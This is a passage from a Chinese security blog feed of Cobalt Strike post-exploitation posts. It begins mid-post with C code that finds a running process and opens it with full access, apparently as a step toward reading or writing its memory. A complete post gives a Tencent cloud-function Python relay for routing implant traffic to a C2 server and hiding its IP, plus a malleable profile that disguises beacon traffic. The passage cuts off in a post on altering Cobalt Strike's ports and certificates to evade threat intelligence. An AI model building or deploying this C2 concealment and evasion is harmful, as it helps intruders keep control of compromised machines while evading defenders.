class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span>    <span class="comment">// 包含 Windows API 函数的头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span>   <span class="comment">// 包含进程快照相关函数的头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>      <span class="comment">// 标准输入输出库</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wchar.h&gt;</span>      <span class="comment">// 宽字符处理库</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：GetRemoteProcessHandle</span></span><br><span class="line"><span class="comment">// 描述：获取指定进程名的远程进程句柄和进程ID</span></span><br><span class="line"><span class="comment">// 参数：</span></span><br><span class="line"><span class="comment">//   szProcessName - 要查找的进程名（宽字符）</span></span><br><span class="line"><span class="comment">//   dwProcessId - 返回找到的进程ID</span></span><br><span class="line"><span class="comment">//   hProcess - 返回找到的进程句柄</span></span><br><span class="line"><span class="comment">// 返回值：成功时返回TRUE，失败时返回FALSE</span></span><br><span class="line">BOOL <span class="title function_">GetRemoteProcessHandle</span><span class="params">(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess)</span> &#123;</span><br><span class="line">    PROCESSENTRY32 Proc;               <span class="comment">// 定义一个 PROCESSENTRY32 结构体来保存进程信息</span></span><br><span class="line">    Proc.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32); <span class="comment">// 初始化结构体的大小</span></span><br><span class="line"></span><br><span class="line">    HANDLE hSnapShot = <span class="literal">NULL</span>;           <span class="comment">// 定义一个快照句柄</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个快照来获取当前所有运行的进程</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        https://learn.microsoft.com/zh-cn/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot</span></span><br><span class="line"><span class="comment">        获取指定进程以及这些进程使用的堆、模块和线程的快照。</span></span><br><span class="line"><span class="comment">        HANDLE CreateToolhelp32Snapshot(</span></span><br><span class="line"><span class="comment">              [in] DWORD dwFlags,</span></span><br><span class="line"><span class="comment">              [in] DWORD th32ProcessID</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">        [in] dwFlags</span></span><br><span class="line"><span class="comment">            TH32CS_SNAPPROCESS  包括系统中快照中的所有进程</span></span><br><span class="line"><span class="comment">        [in] th32ProcessID</span></span><br><span class="line"><span class="comment">            要包含在快照中的进程的进程标识符.此参数可以为零以指示当前进程</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hSnapShot == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="comment">// 如果获取快照失败，打印错误信息</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] CreateToolhelp32Snapshot Failed With Error: %d \n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">goto</span> _EndOfFunction;          <span class="comment">// 跳到函数结尾释放资源</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取快照中第一个进程的信息</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Process32First</span></span><br><span class="line"><span class="comment">        检索有关系统快照中遇到的第一个进程的信息。</span></span><br><span class="line"><span class="comment">        BOOL Process32First(</span></span><br><span class="line"><span class="comment">          [in]      HANDLE           hSnapshot,</span></span><br><span class="line"><span class="comment">          [in, out] LPPROCESSENTRY32 lppe</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        [in] hSnapshot</span></span><br><span class="line"><span class="comment">            快照的句柄，该句柄是从上次调用 CreateToolhelp32Snapshot 函数返回的。</span></span><br><span class="line"><span class="comment">        [in, out] lppe</span></span><br><span class="line"><span class="comment">            指向 PROCESSENTRY32 结构的指针。 它包含进程信息，例如可执行文件的名称、进程标识符和父进程的进程标识符。</span></span><br><span class="line"><span class="comment">        </span></span><br><span class="line"><span class="comment">        如果进程列表的第一个条目已复制到缓冲区，则返回 TRUE ，否则返回 FALSE 。 如果不存在任何进程或快照不包含进程信息，则 GetLastError 函数将返回ERROR_NO_MORE_FILES错误值。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (!Process32First(hSnapShot, &amp;Proc)) &#123;</span><br><span class="line">        <span class="comment">// 如果获取第一个进程失败，打印错误信息</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] Process32First Failed With Error: %d \n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">goto</span> _EndOfFunction;          <span class="comment">// 跳到函数结尾释放资源</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历快照中的所有进程</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        WCHAR LowerName[MAX_PATH * <span class="number">2</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">// 定义一个宽字符数组用于存储进程名的小写形式</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            lstrlenW: 确定指定字符串的长度,(不包括终止 null 字符)</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        DWORD dwSize = lstrlenW(Proc.szExeFile); <span class="comment">// 获取进程名的长度</span></span><br><span class="line">        DWORD i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将进程名转换为小写并保存到LowerName中</span></span><br><span class="line">        <span class="keyword">if</span> (dwSize &lt; MAX_PATH * <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (; i &lt; dwSize; i++) &#123;</span><br><span class="line">                LowerName[i] = (WCHAR)towlower(Proc.szExeFile[i]); <span class="comment">// 转换为小写</span></span><br><span class="line">            &#125;</span><br><span class="line">            LowerName[i] = <span class="string">L&#x27;\0&#x27;</span>; <span class="comment">// 添加字符串结束符</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印当前比较的进程名和目标进程名</span></span><br><span class="line">        wprintf(<span class="string">L&quot;Comparing process: %s with target: %s\n&quot;</span>, LowerName, szProcessName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果转换后的进程名与目标进程名匹配</span></span><br><span class="line">        <span class="keyword">if</span> (wcscmp(LowerName, szProcessName) == <span class="number">0</span>) &#123;</span><br><span class="line">            *dwProcessId = Proc.th32ProcessID; <span class="comment">// 保存进程ID</span></span><br><span class="line">            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID); <span class="comment">// 打开进程并获取句柄</span></span><br><span class="line">            <span class="keyword">if</span> (*hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="comment">// 如果打开进程句柄失败，打印错误信息</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[!] OpenProcess Failed With Error: %d \n&quot;</span>, GetLastError());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// 找到目标进程后退出循环</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (Process32Next(hSnapShot, &amp;Proc)); <span class="comment">// 检索快照中的下一个进程信息</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Process32Next 检索有关系统快照中记录的下一个进程的信息</span></span><br><span class="line"><span class="comment">        BOOL Process32Next(</span></span><br><span class="line"><span class="comment">          [in]  HANDLE           hSnapshot,</span></span><br><span class="line"><span class="comment">          [out] LPPROCESSENTRY32 lppe</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">        [in] hSnapshot</span></span><br><span class="line"><span class="comment">            从对 CreateToolhelp32Snapshot 函数的上一次调用返回的快照句柄。</span></span><br><span class="line"><span class="comment">        [out] lppe</span></span><br><span class="line"><span class="comment">            指向 PROCESSENTRY32 结构的指针。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">_EndOfFunction:</span><br><span class="line">    <span class="keyword">if</span> (hSnapShot != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        CloseHandle(hSnapShot); <span class="comment">// 关闭快照句柄以释放资源</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检查是否成功获取到进程ID和进程句柄，成功返回TRUE，否则返回FALSE</span></span><br><span class="line">    <span class="keyword">if</span> (*dwProcessId == <span class="number">0</span> || *hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    LPWSTR szProcessName = (LPWSTR)<span class="string">L&quot;notepad.exe&quot;</span>; <span class="comment">// 指定要查找的进程名</span></span><br><span class="line">    DWORD processId = <span class="number">0</span>;            <span class="comment">// 定义用于存储找到的进程ID</span></span><br><span class="line">    HANDLE hProcess = <span class="literal">NULL</span>;         <span class="comment">// 定义用于存储找到的进程句柄</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印要查找的进程名</span></span><br><span class="line">    wprintf(<span class="string">L&quot;Looking for process: %s\n&quot;</span>, szProcessName);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用GetRemoteProcessHandle函数以获取进程ID和句柄</span></span><br><span class="line">    <span class="keyword">if</span> (GetRemoteProcessHandle(szProcessName, &amp;processId, &amp;hProcess)) &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Process ID: %lu\n&quot;</span>, processId); <span class="comment">// 打印找到的进程ID</span></span><br><span class="line">        wprintf(<span class="string">L&quot;Process Handle: %p\n&quot;</span>, hProcess); <span class="comment">// 打印找到的进程句柄</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 此处您可以对进程执行需要的操作，例如读写内存等</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭进程句柄以释放资源</span></span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果未找到进程或打开句柄失败，打印错误信息</span></span><br><span class="line">        wprintf(<span class="string">L&quot;Failed to find or open process: %s\n&quot;</span>, szProcessName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 返回0表示程序正常结束</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="Cobalt Strike" scheme="https://jiangjiyue.github.io/tags/Cobalt-Strike/"/>
    
    <category term="后渗透" scheme="https://jiangjiyue.github.io/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    <category term="编程语言" scheme="https://jiangjiyue.github.io/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>CS-云函数隐匿C2</title>
    <link href="https://jiangjiyue.github.io/2024/09/26/da146604/"/>
    <id>https://jiangjiyue.github.io/2024/09/26/da146604/</id>
    <published>2024-09-26T09:15:49.000Z</published>
    <updated>2024-09-26T09:05:42.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">    <p>总字符数: 3.88K </p>    </div>    <div class="cell" style="">    <p>代码: 2.13K, 文本: 0.69K</p>    </div>    <div class="cell" style="">    <p>预计阅读时间: 12 分钟</p>    </div>    </div><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote><p>利用云函数隐匿C2的原理也很简单,其实我们相当于在腾讯云开启了一个代理服务,我们将我们的木马的所有流量通过腾讯云进行转发,而腾讯云有很多出口ip,会随机使用这些ip,达到了隐匿自身真实ip的目的.</p></blockquote><h2 id="云函数配置"><a href="#云函数配置" class="headerlink" title="云函数配置"></a>云函数配置</h2><p>首先我们还是进入腾讯云创建一个自定义函数。选择运行环境为python，将为们的代码复制到函数代码中，我们需要修改我们c2中的地址为我们的c2地址.</p><p><strong>这里只能创建80和443端口的监听，因为我们的流量是通过云函数进来的，云函数只支持80和443，这里的监听实际上是中间人云函数的监听地址和端口，如果云函数C2地址配的是http就开80监听；https就开443，https方式监听</strong></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211061237513.png" data-fancybox="true"/></div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf8</span></span><br><span class="line"><span class="keyword">import</span> json,requests,base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    response = &#123;&#125;</span><br><span class="line">    path = <span class="literal">None</span></span><br><span class="line">    headers = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        C2=<span class="string">&#x27;http://c2ip&#x27;</span></span><br><span class="line">        <span class="keyword">if</span><span class="string">&#x27;path&#x27;</span><span class="keyword">in</span> event.keys():</span><br><span class="line">            path=event[<span class="string">&#x27;path&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span><span class="string">&#x27;headers&#x27;</span><span class="keyword">in</span> event.keys():    </span><br><span class="line">            headers=event[<span class="string">&#x27;headers&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span><span class="string">&#x27;httpMethod&#x27;</span><span class="keyword">in</span> event.keys() <span class="keyword">and</span> event[<span class="string">&#x27;httpMethod&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span> :</span><br><span class="line">            resp=requests.get(C2+path,headers=headers,verify=<span class="literal">False</span>) </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            resp=requests.post(C2+path,data=event[<span class="string">&#x27;body&#x27;</span>],headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="built_in">print</span>(resp.headers)</span><br><span class="line">            <span class="built_in">print</span>(resp.content)</span><br><span class="line">        response=&#123;</span><br><span class="line">            <span class="string">&quot;isBase64Encoded&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&quot;statusCode&quot;</span>: resp.status_code,</span><br><span class="line">            <span class="string">&quot;headers&quot;</span>: <span class="built_in">dict</span>(resp.headers),</span><br><span class="line">            <span class="string">&quot;body&quot;</span>: <span class="built_in">str</span>(base64.b64encode(resp.content))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>然后我们完成云函数的创建，在VSCode中安装模块:<strong>先进入src目录</strong><code>cd src</code></p><p><code>pip3 install requests -t .</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211061316345.png" data-fancybox="true"/></div></div><p>测试:</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409261641041.png" data-fancybox="true"/></div></div><p>进入触发器中创建一个触发器。选择触发器版本为$LATEST，触发方式为API网关触发，开启集成响应。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211061240702.png" data-fancybox="true"/></div></div><p>然后点击我们的API服务名进入API网关进行配置</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409261705328.png" data-fancybox="true"/></div></div><p>点击编辑，将路径修改为&#x2F;</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409261642682.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211061243847.png" data-fancybox="true"/></div></div><p>此时我们已经完成了我们云函数的配置。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211061243050.png" data-fancybox="true"/></div></div><p>此时我们遍可以使用上图的公网域名中的http域名来进行上线了</p><h2 id="c2配置"><a href="#c2配置" class="headerlink" title="c2配置"></a>c2配置</h2><p>然后此时我们要编译一个cs的profile文件，代码如下，我们通过这个文件对我们的包内容进行配置来进行收发包。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> sample_name <span class="string">&quot;func&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> sleeptime <span class="string">&quot;3000&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> jitter    <span class="string">&quot;0&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> maxdns    <span class="string">&quot;255&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> useragent <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;</span>;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/api/x&quot;</span>;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span>;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            <span class="built_in">base64</span>;</span><br><span class="line">            prepend <span class="string">&quot;SESSIONID=&quot;</span>;</span><br><span class="line">            header <span class="string">&quot;Cookie&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/ocsp-response&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;content-transfer-encoding&quot;</span> <span class="string">&quot;binary&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;Nodejs&quot;</span>;</span><br><span class="line">        output &#123;</span><br><span class="line">            <span class="built_in">base64</span>;</span><br><span class="line">            <span class="built_in">print</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;</span><br><span class="line">    <span class="built_in">set</span> uri_x86 <span class="string">&quot;/vue.min.js&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> uri_x64 <span class="string">&quot;/bootstrap-2.min.js&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/api/y&quot;</span>;</span><br><span class="line">    client &#123;</span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span>;</span><br><span class="line">        <span class="built_in">id</span> &#123;</span><br><span class="line">            <span class="built_in">base64</span>;</span><br><span class="line">            prepend <span class="string">&quot;JSESSION=&quot;</span>;</span><br><span class="line">            header <span class="string">&quot;Cookie&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            <span class="built_in">base64</span>;</span><br><span class="line">            <span class="built_in">print</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/ocsp-response&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;content-transfer-encoding&quot;</span> <span class="string">&quot;binary&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span>;</span><br><span class="line">        output &#123;</span><br><span class="line">            <span class="built_in">base64</span>;</span><br><span class="line">            <span class="built_in">print</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cs还自带了一个c2lint工具来帮助我们检验我们编写的profile文件是否正确。如图显示出来我们的请求内容。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211061248019.png" data-fancybox="true"/></div></div><p>然后我们使用命令启动我们的cs<code>./teamserver ip passwd xxx.profile</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211061329992.png" data-fancybox="true"/></div></div><p>设置监听器，这里要注意端口为80，host为我们刚刚在API网关中的地址，注意需要删除前面的http及后面的:80</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211061330733.png" data-fancybox="true"/></div></div><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211061340698.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="D:\Work\桌面\assets\image-20240926164340210.png" data-fancybox="true"/></div></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="Cobalt Strike" scheme="https://jiangjiyue.github.io/tags/Cobalt-Strike/"/>
    
    <category term="后渗透" scheme="https://jiangjiyue.github.io/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>CS-Cobalt Strike修改特征</title>
    <link href="https://jiangjiyue.github.io/2024/09/25/3c3f9499/"/>
    <id>https://jiangjiyue.github.io/2024/09/25/3c3f9499/</id>
    <published>2024-09-25T09:31:49.000Z</published>
    <updated>2024-09-26T03:31:22.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">    <p>总字符数: 38.95K </p>    </div>    <div class="cell" style="">    <p>代码: 34.06K, 文本: 2.08K</p>    </div>    <div class="cell" style="">    <p>预计阅读时间: 2.62 小时</p>    </div>    </div><h2 id="什么是特征"><a href="#什么是特征" class="headerlink" title="什么是特征"></a>什么是特征</h2><p>特征 : 人或事物可供识别的特殊的象征或标志,</p><p><code>cobalt strike</code>也有属于自己的特征 , 比如默认开放的端口号是50050 , 自带证书里面有<code>cobalt strike</code>字符等</p><h2 id="为什么要修改特征"><a href="#为什么要修改特征" class="headerlink" title="为什么要修改特征"></a>为什么要修改特征</h2><p>因为cs服务器如果默认特征不进行修改的话 , 很容易被搜索引擎或者威胁情报标记成木马远控服务器 , 以及进行一些特征的修改就算ip地址暴露了 , 也不能直接肯定这个ip是木马远控 , 提高自身的隐藏性</p><h2 id="如何修改特征"><a href="#如何修改特征" class="headerlink" title="如何修改特征"></a>如何修改特征</h2><p>修改特征是针对cs服务端进行特征的修改 , 客户端不需要修改</p><p><strong>牢记 : cs服务器需要的时候再开启 , 平常不需要的时候就关闭</strong></p><h3 id="修改默认端口"><a href="#修改默认端口" class="headerlink" title="修改默认端口"></a>修改默认端口</h3><p><code>sudo vim teamserver</code> </p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251726309.png" data-fancybox="true"/></div></div><h3 id="修改默认证书"><a href="#修改默认证书" class="headerlink" title="修改默认证书"></a>修改默认证书</h3><blockquote><p>推荐付费ssl证书</p><p>1.购买域名,申请免费的ssl证书</p><p>2.修改teamserver证书密码</p></blockquote><h4 id="查看默认证书"><a href="#查看默认证书" class="headerlink" title="查看默认证书"></a>查看默认证书</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认密码是 Microsoft</span></span><br><span class="line">┌──(kali㉿kali)-[/opt/CS/coablt_strike_4.5_jx]</span><br><span class="line">└─$ keytool -list -v -keystore cobaltstrike.store</span><br><span class="line"></span><br><span class="line">输入密钥库口令:  </span><br><span class="line">密钥库类型: PKCS12</span><br><span class="line">密钥库提供方: SunJSSE</span><br><span class="line"></span><br><span class="line">您的密钥库包含 1 个条目</span><br><span 